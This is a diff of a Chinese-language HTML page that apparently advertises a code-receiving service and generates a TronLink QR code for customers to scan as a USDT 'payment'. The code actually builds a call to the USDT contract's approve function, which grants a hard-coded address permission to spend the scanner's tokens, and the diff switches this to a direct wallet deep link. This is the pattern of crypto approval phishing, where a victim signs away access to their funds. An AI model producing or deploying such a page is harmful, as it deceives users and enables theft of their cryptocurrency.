@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>海内外接码付款 - USDT 授權收款</title>
+<title>專業海內外接碼 - USDT 授權 QR</title>
 <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 <style>
 body { font-family: sans-serif; text-align: center; padding: 40px; }
@@ -13,8 +13,8 @@ button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
 </head>
 <body>
 
-<h2>海内外接码付款</h2>
-<p>請輸入本次收款金額（USDT）</p>
+<h2>專業海內外接碼</h2>
+<p>輸入本次授權金額（USDT），生成 QR 給客戶掃描</p>
 
 <input type="number" id="amount" placeholder="例如 100.5" step="0.000001" min="0.000001">
 <br>
@@ -23,28 +23,25 @@ button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
 <div id="qrcode"></div>
 
 <script>
-// ===== 配置區 =====
-const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"   // 收款地址
-const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj" // USDT TRC20 合約
-// ==================
+// 收款地址
+const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
+// USDT TRC20 合約地址
+const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
 
-function toSun(amount){
-  return BigInt(Math.floor(parseFloat(amount)*1000000))
-}
-
-function pad64(hex){
-  return hex.padStart(64,'0')
-}
+// 工具函式
+function toSun(amount){ return BigInt(Math.floor(parseFloat(amount)*1000000)) }
+function pad64(hex){ return hex.padStart(64,'0') }
 
 function base58ToHex(address){
   const alphabet="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
   let num = 0n
   for(let char of address){ num = num*58n + BigInt(alphabet.indexOf(char)) }
-  let hex=num.toString(16)
+  let hex = num.toString(16)
   if(hex.length % 2) hex="0"+hex
   return hex
 }
 
+// 生成 QR
 function generate(){
   const amountInput = document.getElementById("amount").value
   if(!amountInput || amountInput <= 0){
@@ -53,10 +50,11 @@ function generate(){
   }
 
   const amount = toSun(amountInput)
-  let addressHex = base58ToHex(merchant).substring(2)
+  const addressHex = base58ToHex(merchant).substring(2)
   const parameter = pad64(addressHex) + pad64(amount.toString(16))
 
-  const url = "https://link.tronlink.org/#/wallet/contract?contract=" +
+  // ✅ 深鏈 URL
+  const url = "tronlink://wallet/contract?contract=" +
               usdtContract +
               "&functionSelector=approve(address,uint256)&parameter=" +
               parameter
@@ -72,3 +70,4 @@ function generate(){
 
 </body>
 </html>
+
